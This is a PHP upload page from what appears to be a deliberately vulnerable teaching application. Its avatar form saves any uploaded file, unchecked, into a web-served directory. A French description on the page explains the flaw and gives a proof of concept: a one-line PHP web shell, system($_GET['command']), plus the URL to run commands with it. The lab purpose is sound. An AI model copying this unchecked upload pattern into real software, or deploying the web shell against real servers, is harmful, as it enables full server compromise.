<?php
session_start();
require_once __DIR__ . '/../db_config.php';?>
<!DOCTYPE HTML>
<html>
    <head>
        <title>Upload</title>
        <meta charset="utf-8">
        <link rel="stylesheet" type="text/css" href="css.css">
        <link rel="stylesheet" type="text/css" href="bootstrap/css/bootstrap.min.css">
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
    <head/>
    <body>

        <?php
        if (!isset($_SESSION['id'])) {
            header('Location: index.php');
        }
        ?>


        <div class="jumboton">
            <div class="container">
                <h1><a href="index.php">Administration asso</a></h1>
            </div>
        </div>

        <?php include("menu.php");
            //ajout image asso
            if (isset($_POST['assophoto']) AND ! empty($_POST['assophoto'])) {

                $fichier = basename($_FILES['avatar']['name']);
                $dossier = $_SERVER['DOCUMENT_ROOT'] . '/upload/';
                $id = $_SESSION['id'];

                if (move_uploaded_file($_FILES['avatar']['tmp_name'], $dossier . $fichier)) { //Si la fonction renvoie TRUE, c'est que ça a fonctionné...
                    echo 'Votre fichier a bien été ajouté dans le répertoire de photo (' . $urlsite . 'upload)';
                }
            }

        ?>
        <div id="hauteur">
            <form action="upload.php" method="POST" enctype="multipart/form-data">
                <div id="formulaire">
                    <h1 style="align:center">Ajouter votre avatar</h1>
                    <input type="hidden" name="assophoto" value="plop" id="champs" />
                    <input type="file" name="avatar">
                    <input type="submit" id="inscrire1" value="AJOUTER"/>
                </div> 
            </form>
        </div>
        
        <br/><br/>
        <b>Description: </b>
        Cette page contient une faille upload.<br/>
        Si un utilisateur utilise le formulaire il a un accès total au serveur !!!!<br/>
        <br/>
        <br/>
        <b>POC:</b> 
        Pour tester, uploadez un fichier .php contenant uniquement la ligne de code suivante :<br/><br/>
        system($_GET['command']); <br/><br/>
        Vous pouvez maintenant aller dans le répertoire <?=$urlsite ?>upload.
        Vous pouvez voir votre script, et lancer des commandes directement dans le prompt du serveur en requêtant:<br/>
        <?=$urlsite ?>upload/nomdufichieruploadé?command=ls ..<br/>
        

    <body/>   
</html>